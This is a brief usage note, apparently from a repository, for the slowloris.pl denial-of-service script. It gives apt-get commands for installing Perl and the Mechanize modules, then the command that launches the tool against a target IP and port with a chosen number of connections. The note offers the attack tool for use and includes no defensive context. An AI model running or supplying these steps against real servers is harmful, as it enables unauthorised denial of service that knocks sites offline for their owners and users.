/*** if needed ***/
# sudo apt-get update  
# sudo apt-get install perl
# sudo apt-get install libwww-mechanize-shell-perl
# sudo apt-get install perl-mechanize
/*****************/

./slowloris

// command (find options)
./slowloris.pl -dns xxx.xxx.xxx.xxx -port xxx -num xxx
